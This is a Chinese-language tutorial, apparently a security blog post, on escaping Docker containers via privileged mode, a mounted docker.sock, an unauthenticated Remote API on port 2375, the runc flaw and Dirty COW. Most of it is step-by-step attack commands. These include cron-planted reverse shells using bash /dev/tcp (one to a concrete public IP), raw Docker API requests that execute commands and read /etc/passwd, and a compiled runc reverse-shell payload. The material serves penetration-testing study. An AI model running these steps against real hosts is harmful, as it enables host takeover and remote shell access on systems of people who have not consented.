# 原理

docker其实就是一个linux下的进程，它通过NameSpace 等命令实现了内核级别环境隔离（文件、网络、资源），所以相比虚拟机而言，Docker
的隔离性要弱上不少 ，这就导致可以通过很多方法来进行docker逃逸。

# 环境搭建

    
    
    curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o docker.sh && bash docker.sh
    

# Docker 环境判断

1、查找.dockerenv文件

docker下默认存在dockerenv文件，而非docker环境中则没有

![](./img/9139964984082161370.png)  
2、查询cgroup进程

    
    
    cat /proc/1/cgroup
    

![](./img/519673320378562996.png)  
3、查看容器环境变量

    
    
    cat /proc/1/environ
    

![](./img/6403176087684989576.png)

# Docker 容器逃逸

## 特权模式逃逸

以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。

### 如何判断是否为特权模式

在suid提权中SUID设置的程序出现漏洞就非常容易被利用，所以 Linux 引入了 Capability
机制以此来实现更加细致的权限控制，从而增加系统的安全性

当容器为特权模式时，将添加如下功能：[使用指南 -特权容器](https://www.bookstack.cn/read/openeuler-21.03-zh/70e0731add42ae6d.md)

![](./img/794941907548951232.png)  
但这里并不能说拥有以上某种功能就是特权容器，因为特权容器还需满足：

  * 必须缺少AppArmor配置文件，否则将允许mount syscall
  * 能够“看到”很多敏感的dev设备

上述两个条件目前还不知道如何获取，所以重点看下特权容器中获取的 Cap 集合

    
    
    root@227b7e10b9a6:/# cat /proc/1/status | grep Cap
    CapInh: 0000000000000000
    CapPrm: 0000001fffffffff
    CapEff: 0000001fffffffff
    CapBnd: 0000001fffffffff
    CapAmb: 0000000000000000
    

CapEff 主要是检查线程的执行权限，所以重点看下利用 `capsh --decode=0000003fffffffff` 进行解码，检索默认没有添加的
NET_ADMIN，发现存在

![](./img/5859719100049896518.png)  
而非特权容器的 Cap 集合值并进行解码，发现并不存在 NET_ADMIN

因此当执行 `cat /proc/1/status | grep Cap` 查询对应出来的值为 `0000003fffffffff`
那么就有可能是特权容器，可尝试逃逸

### 逃逸

1、首先以特权模式运行一个docker容器

    
    
    docker run -it --privileged 镜像id /bin/bash
    

2、查看磁盘文件

    
    
    fdisk -l

![](./img/346351442253400249.png)  
3、新建一个目录,将/dev/vda1挂载至新建的目录

    
    
    mkdir /test
    mount /dev/vda1 /test
    

4、写入计划任务到宿主机

    
    
    echo '* * * * * bash -i >& /dev/tcp/ip/4000 0>&1' >> /test/var/spool/cron/root
    

5、成功反弹shell

![](./img/7919559506639120789.png)

## docker.sock挂载逃逸

Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker
daemon(docker守护进程)扮演，二者之间通信方式有以下3种：

    
    
    1、unix:///var/run/docker.sock
    2、tcp://host:port
    3、fd://socketfd

其中使用docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。  
本质上而言，能够访问docker socket 或连接HTTPS
API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。  
因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker
socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker
daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。

### 逃逸

1、运行一个挂载/var/run/的容器

    
    
    docker run -it -v /var/run/:/host/var/run/ 5d2df19066ac /bin/bash
    

2、寻找下挂载的sock文件

    
    
    find / -name docker.sock

![](./img/8063605055190391337.png)  
3、在容器内安装client，即docker

    
    
    apt-get update
    apt-get install docker.io
    

4、查看宿主机docker信息

    
    
    docker -H unix:///host/var/run/docker.sock info

5、运行一个新容器并挂载宿主机根路径

    
    
    docker -H unix:///host/var/run/docker.sock run -v /:/test -it ubuntu:14.04 /bin/bash

![](./img/7704390470315751387.png)  
6、写入计划任务到宿主机

    
    
    echo '* * * * * bash -i >& /dev/tcp/ip/4000 0>&1' >> /test/var/spool/cron/root
    

## Remote API未授权访问

docker swarm中默认通过2375端口通信。绑定了一个Docker Remote
API的服务，可以通过HTTP、Python、调用API来操作Docker。

### 未授权访问

当使用官方推荐启动方式时

    
    
    dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375

在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。

![](./img/3677771119197449257.png)  
1、此时访问/containers/json，便会得到所有容器id字段

![](./img/5173000012588476216.png)  
2、创建一个 exec

    
    
    POST /containers/<container_id>/exec HTTP/1.1
    Host: <docker_host>:PORT
    Content-Type: application/json
    Content-Length: 188
    
    {
      "AttachStdin": true,
      "AttachStdout": true,
      "AttachStderr": true,
      "Cmd": ["cat", "/etc/passwd"],
      "DetachKeys": "ctrl-p,ctrl-q",
      "Privileged": true,
      "Tty": true
    }
    

发包后返回exec的id参数

![](./img/4723224410576529665.png)  
3、执行exec中的命令，成功读取passwd文件

    
    
    POST /exec/<exec_id>/start HTTP/1.1
    Host: <docker_host>:PORT
    Content-Type: application/json
    
    {
     "Detach": false,
     "Tty": false
    }
    

![](./img/180880494360107235.png)  
这种方式只是获取到了docker主机的命令执行权限，但是还无法逃逸到宿主机。因此还是需要写公钥或者计时任务进行逃逸

### 逃逸

1、在容器内安装docker

    
    
    apt-get update
    apt-get install docker.io
    

2、查看宿主机docker镜像信息

    
    
    docker -H tcp://ip:2375 images

![](./img/7681032062962372547.png)  
3、启动一个容器并将宿主机根目录挂在到容器的test目录

    
    
    docker -H tcp://ip:2375 run -it -v /:/test 5d2df19066ac /bin/bash

4、计时任务反弹shell

    
    
    echo '* * * * * bash -i >& /dev/tcp/101.200.208.44/4000 0>&1' >> /test/var/spool/cron/root
    

## 容器服务缺陷逃逸

runc是一个底层服务工具，runC
管理容器的创建，运行，销毁等，docker部分版本服务运行时底层其实在运行着runc服务，攻击者可以通过特定的容器镜像或者exec操作重写宿主机上的runc
二进制文件，并在宿主机上以root身份执行命令。

### 影响版本

docker version <=18.09.2

RunC version <=1.0-rc6

### 环境搭建

由于对版本有限制，所以用之前docker中的ubuntu环境搭建符合漏洞版本的docker，参考[Ubuntu安装指定版本的docker - 朝花夕拾 -SegmentFault 思否](https://segmentfault.com/a/1190000042702027?utm_source=sf-similar-article)

1、安装 apt 依赖包，用于通过HTTPS来获取仓库

    
    
    apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common

2、添加 Docker 的官方 GPG 密钥

    
    
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -    

3、设置稳定版仓库(添加到/etc/apt/sources.list中)

    
    
    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
    

4、更新apt-get

    
    
    apt-get update

5、查询docker-ce版本

    
    
    apt-cache policy docker-ce
    

6、安装指定版本docker

    
    
    apt-get install docker-ce=18.06.1~ce~3-0~ubuntu
    

### 逃逸

1、编译payload中反弹shell地址

![](./img/6382267901422472420.png)  
2、编译生成payload

    
    
    CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
    

3、编译好后传入docker容器中

    
    
    docker cp main 1fa6a736e332:/home
    docker exec -it 1fa6a736e332 /bin/bash
    cd /home/
    chmod 777 main
    

4.运行main程序成功反弹shell

    
    
    ./main
    

## 脏牛漏洞逃逸

Dirty Cow是Linux内核中的提权漏洞，源于Linux内核的内存子系统在处理写入拷贝时存在竞争条件（race
condition），允许恶意用户提权获取其他只读内存映射的写访问权限。

docker和宿主机共享内核，因此就可利用该漏洞进行逃逸

    
    
    git clone https://github.com/gebl/dirtycow-docker-vdso.git
    cd dirtycow-docker-vdso/
    docker-compose run dirtycow /bin/bash
    
    cd /dirtycow-vdso/
    make
    ./0xdeadbeef ip:port // 反弹shell
    

